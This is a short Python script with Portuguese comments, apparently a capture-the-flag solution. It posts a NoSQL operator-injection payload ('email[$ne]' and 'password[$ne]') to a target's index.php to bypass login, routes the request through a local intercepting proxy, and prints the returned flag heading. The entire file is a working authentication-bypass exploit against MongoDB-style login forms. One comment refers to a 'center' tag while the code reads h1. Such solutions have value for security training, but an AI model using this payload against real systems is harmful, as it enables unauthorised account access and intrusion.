import requests
import sys
from bs4 import BeautifulSoup #Parsing de HTML

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = f"{sys.argv[1]}/index.php"

data = {
	'email[$ne]': 'sjxjsakbxjsak@teste.com',
	'password[$ne]': 'gfbfgbfgbfbfg'
}

response = requests.post(url, data=data, headers=headers, proxies=proxies)
html_response = response.text # Salva a response em uma variável
soup = BeautifulSoup(html_response, 'html.parser') # Faz o parsing da response salva
results_tag = soup.find("h1") # Filtra pela tag HTML "center"
print(results_tag.get_text()) # Printa somente da flag sem as tags html <h1>